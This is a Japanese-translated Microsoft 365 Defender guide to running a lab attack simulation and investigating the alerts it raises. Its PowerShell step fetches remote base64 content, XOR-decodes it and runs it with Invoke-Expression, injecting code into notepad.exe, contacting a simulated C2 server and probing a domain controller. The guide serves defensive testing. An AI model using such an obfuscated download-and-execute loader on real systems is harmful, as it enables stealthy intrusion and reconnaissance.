---
title: Microsoft 365 Defender 攻撃のシミュレーションを実行する
description: Microsoft 365 Defender パイロットプロジェクトに対して攻撃シミュレーションを実行して、が展開とその迅速な修復方法を確認します。
keywords: Microsoft Threat Protection パイロット攻撃シミュレーション、Microsoft Threat protection パイロット攻撃シミュレーション、microsoft の脅威保護、Microsoft Threat Protection パイロットプロジェクト、サイバーセキュリティ、高度な脅威、エンタープライズセキュリティ、デバイス、デバイス、id、ユーザー、データ、アプリケーション、インシデント、自動化された調査と修復、高度な検索
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.openlocfilehash: 700bd7a3f4ba8d152cf66a27c0f66aa375872698
ms.sourcegitcommit: 815229e39a0f905d9f06717f00dc82e2a028fa7c
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 11/03/2020
ms.locfileid: "48842064"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a><span data-ttu-id="7e270-104">Microsoft 365 Defender 攻撃のシミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="7e270-104">Run your Microsoft 365 Defender attack simulations</span></span>  

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


<span data-ttu-id="7e270-105">**適用対象:**</span><span class="sxs-lookup"><span data-stu-id="7e270-105">**Applies to:**</span></span>
- <span data-ttu-id="7e270-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="7e270-106">Microsoft 365 Defender</span></span>
<br>
<table border="0" width="100%" align="center">
  <tr style="text-align:center;">
    <td align="center" style="width:25%; border:0;" >
      <a href= "https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-plan"> 
        <img src="../../media/mtp/plan.png" alt="Plan your pilot Microsoft 365 Defender project" title="パイロットを計画する Microsoft 365 Defender プロジェクト" />
      <br/><span data-ttu-id="7e270-108">計画 </a></span><span class="sxs-lookup"><span data-stu-id="7e270-108">Plan </a></span></span><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/prepare-mtpeval">
        <img src="../../media/mtp/prep.png" alt="Prepare your Microsoft 365 Defender trial lab or pilot environment" title="Microsoft 365 Defender 試用ラボまたはパイロット環境の準備" />
      <br/><span data-ttu-id="7e270-110">作る </a></span><span class="sxs-lookup"><span data-stu-id="7e270-110">Prepare </a></span></span><br>
    </td>
    <td align="center"bgcolor="#d5f5e3">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-simulate">
        <img src="../../media/mtp/run-sim.png" alt="Run your Microsoft 365 Defender attack simulations" title="Microsoft 365 Defender 攻撃のシミュレーションを実行する" />
      <br/><span data-ttu-id="7e270-112">攻撃をシミュレートする </a></span><span class="sxs-lookup"><span data-stu-id="7e270-112">Simulate attack </a></span></span><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-close">
        <img src="../../media/mtp/close.png" alt="Close and summarize your Microsoft 365 Defender pilot" title="Microsoft 365 Defender パイロットの終了と概要" />
      <br/><span data-ttu-id="7e270-114">閉じて概要をまとめる </a></span><span class="sxs-lookup"><span data-stu-id="7e270-114">Close and summarize </a></span></span><br>
    </td>
  </tr>
  <tr>
    <td style="width:25%; border:0;">
   
    </td>
    <td valign="top" style="width:25%; border:0;">
    
</td>
    <td valign="top" style="width:25%; border:0;">

</td>    
    <td valign="top" style="width:25%; border:0;">

</td>
  </tr>
</table>

<span data-ttu-id="7e270-115">現在、攻撃のシミュレーションフェーズになっています。</span><span class="sxs-lookup"><span data-stu-id="7e270-115">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="7e270-116">パイロット環境の準備が完了したら、Microsoft 365 Defender インシデント管理および自動調査と修復の機能をテストします。</span><span class="sxs-lookup"><span data-stu-id="7e270-116">After preparing your pilot environment, it’s time to test the Microsoft 365 Defender incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="7e270-117">高度な技術を活用して、検出から隠すことができる高度な攻撃をシミュレートするのに役立ちます。</span><span class="sxs-lookup"><span data-stu-id="7e270-117">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="7e270-118">この攻撃は、ドメインコントローラーで開かれているサーバーメッセージブロック (SMB) セッションを列挙し、ユーザーのデバイスの最近の IP アドレスを取得します。</span><span class="sxs-lookup"><span data-stu-id="7e270-118">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices.</span></span> <span data-ttu-id="7e270-119">通常、このカテゴリの攻撃には、犠牲者のデバイスで削除されたファイルは含まれません。メモリ内でのみ発生します。</span><span class="sxs-lookup"><span data-stu-id="7e270-119">This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory.</span></span> <span data-ttu-id="7e270-120">既存のシステムおよび管理ツールを使用して、そのコードをシステムプロセスに挿入して実行を非表示にすることによって、"陸地から離れた" ままにします。このような動作によって、回避が検出され、デバイス上で保持されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-120">They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="7e270-121">このシミュレーションでは、サンプルシナリオは PowerShell スクリプトで始まります。</span><span class="sxs-lookup"><span data-stu-id="7e270-121">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="7e270-122">ユーザーがスクリプトを実行するように設定されている可能性があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-122">A user might be tricked into running a script.</span></span> <span data-ttu-id="7e270-123">または、このスクリプトは、以前に感染したデバイスからの別のコンピューターへのリモート接続から実行される可能性があります。これは、攻撃者がネットワーク内で laterally を移動しようとしています。</span><span class="sxs-lookup"><span data-stu-id="7e270-123">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="7e270-124">さまざまな管理作業を実行するために、管理者がスクリプトをリモートで実行することもよくあるため、これらのスクリプトを検出するのは困難な場合があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-124">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Fileless PowerShell アタックとプロセスインジェクションおよび SMB reconnaisance 攻撃図](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="7e270-126">シミュレーションの間、攻撃はシェルコードを一見無害なプロセスに挿入します。</span><span class="sxs-lookup"><span data-stu-id="7e270-126">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="7e270-127">このシナリオでは、notepad.exe を使用する必要があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-127">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="7e270-128">シミュレーションではこのプロセスを選択しましたが、攻撃者は svchost.exe など、長時間実行されるシステムプロセスを対象とする可能性が高くなります。</span><span class="sxs-lookup"><span data-stu-id="7e270-128">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="7e270-129">次に、シェルコードによって、攻撃者のコマンドとコントロール (C2) サーバーとの間の連絡を受け、処理を進める手順を受信します。</span><span class="sxs-lookup"><span data-stu-id="7e270-129">The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="7e270-130">スクリプトは、ドメインコントローラー (DC) に対して偵察クエリの実行を試行します。</span><span class="sxs-lookup"><span data-stu-id="7e270-130">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="7e270-131">偵察によって、攻撃者は最近のユーザーログイン情報に関する情報を取得できます。</span><span class="sxs-lookup"><span data-stu-id="7e270-131">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="7e270-132">攻撃者は、この情報を入手すると、ネットワーク内の laterally を移動して特定の機密アカウントにアクセスできるようになります。</span><span class="sxs-lookup"><span data-stu-id="7e270-132">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

>[!IMPORTANT]
><span data-ttu-id="7e270-133">最適な結果を得るには、攻撃のシミュレーション手順に従ってください。</span><span class="sxs-lookup"><span data-stu-id="7e270-133">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>


## <a name="simulation-environment-requirements"></a><span data-ttu-id="7e270-134">シミュレーション環境の要件</span><span class="sxs-lookup"><span data-stu-id="7e270-134">Simulation environment requirements</span></span>

<span data-ttu-id="7e270-135">準備段階で既にパイロット環境を構成してあるので、このシナリオでは、テストデバイスとドメインコントローラーという2つのデバイスがあることを確認してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-135">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1.  <span data-ttu-id="7e270-136">テナントで [Microsoft 365 Defender が有効になっ](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)ていることを確認します。</span><span class="sxs-lookup"><span data-stu-id="7e270-136">Verify your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>

2.  <span data-ttu-id="7e270-137">テストドメインコントローラーの構成を確認します。</span><span class="sxs-lookup"><span data-stu-id="7e270-137">Verify your test domain controller configuration:</span></span>

    - <span data-ttu-id="7e270-138">デバイスは Windows Server 2008 R2 以降のバージョンで実行されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-138">Device runs with Windows Server 2008 R2 or a later version.</span></span>
    - <span data-ttu-id="7e270-139">[Id 用の Microsoft Defender への](https://docs.microsoft.com/azure/security-center/security-center-wdatp)テストドメインコントローラー、および[リモート管理](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)を有効にします。</span><span class="sxs-lookup"><span data-stu-id="7e270-139">The test domain controller to [Microsoft Defender for Identity](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>    
    - <span data-ttu-id="7e270-140">[Microsoft Defender For Identity と Microsoft Cloud App Security 統合](https://docs.microsoft.com/cloud-app-security/aatp-integration)が有効になっていることを確認します。</span><span class="sxs-lookup"><span data-stu-id="7e270-140">Verify that [Microsoft Defender for Identity and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.</span></span>
    - <span data-ttu-id="7e270-141">ドメインにテストユーザーが作成されます。管理者のアクセス許可は必要ありません。</span><span class="sxs-lookup"><span data-stu-id="7e270-141">A test user is created on your domain – no admin permissions needed.</span></span>

3.  <span data-ttu-id="7e270-142">テストデバイスの構成を確認します。</span><span class="sxs-lookup"><span data-stu-id="7e270-142">Verify test device configuration:</span></span>
 
    1.  <span data-ttu-id="7e270-143">デバイスは Windows 10 バージョン1903またはそれ以降のバージョンで実行されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-143">Device runs with Windows 10 version 1903 or a later version.</span></span>
    
    1.  <span data-ttu-id="7e270-144">テストデバイスはテストドメインに参加しています。</span><span class="sxs-lookup"><span data-stu-id="7e270-144">Test device is joined to the test domain.</span></span>
    
    1.  <span data-ttu-id="7e270-145">[Windows Defender ウイルス対策を有効](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)にします。</span><span class="sxs-lookup"><span data-stu-id="7e270-145">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="7e270-146">Windows Defender ウイルス対策を有効にする際に問題が発生した場合は、この [トラブルシューティングのトピック](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)を参照してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-146">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    
    1.  <span data-ttu-id="7e270-147">テストデバイスが [エンドポイントの Microsoft Defender に利用](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)していることを確認します)。</span><span class="sxs-lookup"><span data-stu-id="7e270-147">Verify that the test device is [onboarded to Microsoft Defender for Endpoint)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="7e270-148">既存のテナントを使用し、デバイスグループを実装する場合は、テストデバイス用の専用デバイスグループを作成し、構成 UX の最上位レベルにプッシュします。</span><span class="sxs-lookup"><span data-stu-id="7e270-148">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>


## <a name="run-the-simulation"></a><span data-ttu-id="7e270-149">シミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="7e270-149">Run the simulation</span></span>

<span data-ttu-id="7e270-150">Attack scenario シミュレーションを実行するには、次の手順を実行します。</span><span class="sxs-lookup"><span data-stu-id="7e270-150">To run the attack scenario simulation:</span></span>

1.  <span data-ttu-id="7e270-151">テストユーザーアカウントを使用して、テストデバイスにログインします。</span><span class="sxs-lookup"><span data-stu-id="7e270-151">Log in to the test device with the test user account.</span></span>

2.  <span data-ttu-id="7e270-152">テストデバイスで Windows PowerShell ウィンドウを開きます。</span><span class="sxs-lookup"><span data-stu-id="7e270-152">Open a Windows PowerShell window on the test device.</span></span>

3.  <span data-ttu-id="7e270-153">次のシミュレーションスクリプトをコピーします。</span><span class="sxs-lookup"><span data-stu-id="7e270-153">Copy the following simulation script:</span></span>

    ```powershell
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
    ```
    
    > [!NOTE]
    > <span data-ttu-id="7e270-154">このドキュメントを web ブラウザーで開くと、特定の文字を失わずに完全なテキストをコピーしたり、改行を加えることができない問題が発生することがあります。</span><span class="sxs-lookup"><span data-stu-id="7e270-154">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="7e270-155">このドキュメントをダウンロードし、Adobe Reader で開きます。</span><span class="sxs-lookup"><span data-stu-id="7e270-155">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="7e270-156">プロンプトで、貼り付けてコピーしたスクリプトを実行します。</span><span class="sxs-lookup"><span data-stu-id="7e270-156">At the prompt, paste and run the copied script.</span></span>

>[!NOTE]
><span data-ttu-id="7e270-157">リモートデスクトッププロトコル (RDP) を使用して PowerShell を実行している場合は、 **CTRL キーを押しながら** ホットキーまたは右クリックによる貼り付けの方法が機能しない可能性があるため、rdp クライアントの [クリップボードテキストの入力] コマンドを使用します。</span><span class="sxs-lookup"><span data-stu-id="7e270-157">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span>  <span data-ttu-id="7e270-158">最近使用したバージョンの PowerShell では、このメソッドが受け入れられない場合があります。メモ帳をメモリに最初にコピーして、仮想マシンにコピーしてから、PowerShell に貼り付ける必要があるかもしれません。</span><span class="sxs-lookup"><span data-stu-id="7e270-158">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="7e270-159">数秒後に、 <i>notepad.exe</i> が開きます。</span><span class="sxs-lookup"><span data-stu-id="7e270-159">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="7e270-160">シミュレートされた攻撃コードが notepad.exe に組み込まれます。</span><span class="sxs-lookup"><span data-stu-id="7e270-160">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="7e270-161">自動的に生成されたメモ帳インスタンスを開いたままにしておくと、完全なシナリオが発生します。</span><span class="sxs-lookup"><span data-stu-id="7e270-161">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="7e270-162">シミュレートされた攻撃コードは、外部 IP アドレス (C2 サーバーをシミュレートしたもの) と通信し、SMB を介してドメインコントローラーに対して偵察を試行します。</span><span class="sxs-lookup"><span data-stu-id="7e270-162">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="7e270-163">このスクリプトが完了すると、PowerShell コンソールにメッセージが表示されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-163">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0      
```

<span data-ttu-id="7e270-164">自動インシデントアンドレスポンス機能を確認するには、notepad.exe プロセスを開いたままにします。</span><span class="sxs-lookup"><span data-stu-id="7e270-164">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="7e270-165">自動インシデントと応答が表示され、メモ帳のプロセスが停止します。</span><span class="sxs-lookup"><span data-stu-id="7e270-165">You'll see Automated Incident and Response stop the Notepad process.</span></span>


## <a name="investigate-an-incident"></a><span data-ttu-id="7e270-166">インシデントの調査</span><span class="sxs-lookup"><span data-stu-id="7e270-166">Investigate an incident</span></span>

>[!NOTE]
><span data-ttu-id="7e270-167">このシミュレーションを開始する前に、次のビデオを参照して、調査プロセスの一環として、インシデント管理が関連アラートをどのように支援するかを確認し、ポータルでその情報を見つけられるようにして、セキュリティの操作にどのように役立てることができるかを見ていきましょう。</span><span class="sxs-lookup"><span data-stu-id="7e270-167">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="7e270-168">SOC アナリストの視点に切り替えると、Microsoft 365 セキュリティセンターポータルで攻撃の調査を開始できるようになります。</span><span class="sxs-lookup"><span data-stu-id="7e270-168">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span> 

1.  <span data-ttu-id="7e270-169">[Microsoft 365 セキュリティセンターポータル](https://security.microsoft.com/incidents)のインシデントのキューを任意のデバイスから開きます。</span><span class="sxs-lookup"><span data-stu-id="7e270-169">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2.  <span data-ttu-id="7e270-170">メニューから [ **インシデント** ] に移動します。</span><span class="sxs-lookup"><span data-stu-id="7e270-170">Navigate to **Incidents** from the menu.</span></span> 

    ![Microsoft 365 セキュリティセンターの左側のメニューに表示されるインシデントのスクリーンショット](../../media/mtp/fig1.png)

3.  <span data-ttu-id="7e270-172">シミュレートされた攻撃の新しいインシデントは、インシデントキューに表示されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-172">The new incident for the simulated attack will appear in the incident queue.</span></span>
 
    ![インシデントキューのスクリーンショット](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="7e270-174">1つのインシデントとしての攻撃を調査する</span><span class="sxs-lookup"><span data-stu-id="7e270-174">Investigate the attack as a single incident</span></span>

<span data-ttu-id="7e270-175">Microsoft 365 Defender は、分析を関連付け、さまざまな製品に関するすべての関連アラートと調査を1つのインシデントエンティティに集約します。</span><span class="sxs-lookup"><span data-stu-id="7e270-175">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="7e270-176">これにより、Microsoft 365 Defender はより広範な攻撃ストーリーを示し、SOC アナリストが複雑な脅威について理解し、それに対応できるようにします。</span><span class="sxs-lookup"><span data-stu-id="7e270-176">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="7e270-177">このシミュレーション中に生成されたアラートは同じ脅威に関連付けられているため、1つのインシデントとして自動的に集約されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-177">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="7e270-178">インシデントを表示するには:</span><span class="sxs-lookup"><span data-stu-id="7e270-178">To view the incident:</span></span>

1.  <span data-ttu-id="7e270-179">[ **インシデント** キューに移動します。</span><span class="sxs-lookup"><span data-stu-id="7e270-179">Navigate to the **Incidents** queue.</span></span>
 
    ![ナビゲーションメニューの [インシデント] のスクリーンショット](../../media/mtp/fig1.png)

2.  <span data-ttu-id="7e270-181">インシデント名の左にある円をクリックして、最新のアイテムを選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-181">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="7e270-182">サイドパネルには、関連するすべての通知を含む、インシデントに関する追加情報が表示されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-182">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="7e270-183">各インシデントには、それに含まれる通知の属性に基づいて、それぞれについて説明する一意の名前が付いています。</span><span class="sxs-lookup"><span data-stu-id="7e270-183">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

    ![シミュレーション中に生成されたアラートが集約されるインシデントページのスクリーンショット](../../media/mtp/fig4.png)

    <span data-ttu-id="7e270-185">ダッシュボードに表示される通知は、サービスリソースに基づいてフィルターできます。 Id には Microsoft Defender、microsoft Cloud App Security、エンドポイントの場合は microsoft defender、microsoft 365 Defender、Microsoft Defender for Office 365 があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-185">The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>  

3.  <span data-ttu-id="7e270-186">[ **インシデントを開く] ページ** を選択して、インシデントに関する詳細情報を取得します。</span><span class="sxs-lookup"><span data-stu-id="7e270-186">Select **Open incident page** to get more information about the incident.</span></span>

    <span data-ttu-id="7e270-187">[ **インシデント** ] ページには、インシデントに関連するすべてのアラートと情報が表示されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-187">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="7e270-188">情報には、アラートに関係するエンティティとアセット、アラートの検出ソース (Microsoft Defender for Identity、EDR)、およびそれらがリンクされた理由が含まれます。</span><span class="sxs-lookup"><span data-stu-id="7e270-188">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="7e270-189">[インシデント] アラートリストの確認は、攻撃の進行状況を示します。</span><span class="sxs-lookup"><span data-stu-id="7e270-189">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="7e270-190">このビューでは、個々の通知を確認して調べることができます。</span><span class="sxs-lookup"><span data-stu-id="7e270-190">From this view, you can see and investigate the individual alerts.</span></span>

    <span data-ttu-id="7e270-191">また、右側のメニューから [ **インシデントの管理** ] をクリックして、インシデントをタグ付けし、自分に割り当て、コメントを追加することもできます。</span><span class="sxs-lookup"><span data-stu-id="7e270-191">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

    ![[インシデントの管理] をクリックする場所のスクリーンショット](../../media/mtp/fig5a.png)

    ![<span data-ttu-id="7e270-193">インシデントをタグ付けし、自分自身に割り当て、コメントを追加できる、[インシデントの管理] パネルのフィールドのスクリーンショット</span><span class="sxs-lookup"><span data-stu-id="7e270-193">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a><span data-ttu-id="7e270-194">生成された通知を確認する</span><span class="sxs-lookup"><span data-stu-id="7e270-194">Review generated alerts</span></span> 

<span data-ttu-id="7e270-195">シミュレートされた攻撃で生成されるアラートのいくつかを見てみましょう。</span><span class="sxs-lookup"><span data-stu-id="7e270-195">Let’s look at some of the alerts generated during the simulated attack.</span></span>

>[!NOTE]
><span data-ttu-id="7e270-196">ここでは、シミュレートされた攻撃の際に生成される警告のうちのいくつかについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7e270-196">We’ll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="7e270-197">テストデバイスで実行されている Windows のバージョンと Microsoft 365 Defender 製品によっては、順序が若干異なるアラートが表示されることがあります。</span><span class="sxs-lookup"><span data-stu-id="7e270-197">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![生成されたアラートのスクリーンショット](../../media/mtp/fig6.png) 


<span data-ttu-id="7e270-199">**通知: 疑わしいプロセスインジェクション (ソース: エンドポイントのための Microsoft Defender EDR)**</span><span class="sxs-lookup"><span data-stu-id="7e270-199">**Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)**</span></span>

<span data-ttu-id="7e270-200">高度な攻撃者は、高度で stealthy のメソッドを使用して、メモリ内に保持し、検出ツールから非表示にします。</span><span class="sxs-lookup"><span data-stu-id="7e270-200">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="7e270-201">一般的な方法の1つは、悪意のある実行可能ファイルではなく、信頼されたシステムプロセス内から操作することです。これにより、検出ツールおよびセキュリティ操作が悪意のあるコードを特定するのを困難にします。</span><span class="sxs-lookup"><span data-stu-id="7e270-201">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="7e270-202">SOC アナリストがこれらの高度な攻撃をキャッチできるようにするために、エンドポイントの Microsoft Defender の深いメモリセンサーを使用すると、さまざまなプロセス間のコード注入手法について、従来のクラウドサービスの可視性を実現できます。</span><span class="sxs-lookup"><span data-stu-id="7e270-202">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="7e270-203">次の図は、 <i>notepad.exe</i>にコードを挿入しようとしたときに、エンドポイントの要求が検出およびアラートになる方法を示しています。</span><span class="sxs-lookup"><span data-stu-id="7e270-203">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![悪意のある可能性のあるコードの挿入に関する警告のスクリーンショット](../../media/mtp/fig7.png) 


<span data-ttu-id="7e270-205">**警告: コマンドライン引数を指定せずにプロセスを実行すると予期しない動作が行われます (Source: Microsoft Defender for Endpoint EDR)**</span><span class="sxs-lookup"><span data-stu-id="7e270-205">**Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)**</span></span>

<span data-ttu-id="7e270-206">エンドポイントの検出に関する Microsoft Defender は、多くの場合、攻撃手法の最も一般的な属性を対象としています。</span><span class="sxs-lookup"><span data-stu-id="7e270-206">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="7e270-207">この方法により、耐久性が確保され、攻撃者が新しい戦術に切り替えるための水準が上がります。</span><span class="sxs-lookup"><span data-stu-id="7e270-207">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="7e270-208">大規模な学習アルゴリズムを使用して、組織内および世界中の共通プロセスの通常の動作を確立し、これらのプロセスが異常な動作を示しているかを監視します。</span><span class="sxs-lookup"><span data-stu-id="7e270-208">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="7e270-209">このような異常動作は、多くの場合、余分なコードが導入され、それ以外の信頼できるプロセスで実行されていることを示します。</span><span class="sxs-lookup"><span data-stu-id="7e270-209">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

<span data-ttu-id="7e270-210">このシナリオでは、プロセス <i>notepad.exe</i> は、外部の場所との通信を含む異常な動作を示しています。</span><span class="sxs-lookup"><span data-stu-id="7e270-210">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="7e270-211">この結果は、悪意のあるコードを導入して実行するために使用された特定の方法から独立しています。</span><span class="sxs-lookup"><span data-stu-id="7e270-211">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

>[!NOTE]
><span data-ttu-id="7e270-212">このアラートは、追加のバックエンド処理を必要とする machine learning モデルに基づいているため、ポータルでこの通知が表示されるまでには時間がかかる場合があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-212">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="7e270-213">アラートの詳細には、外部 IP アドレスが含まれていることに注意してください。これは、ピボットとして使用して、調査を拡張するための指標です。</span><span class="sxs-lookup"><span data-stu-id="7e270-213">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

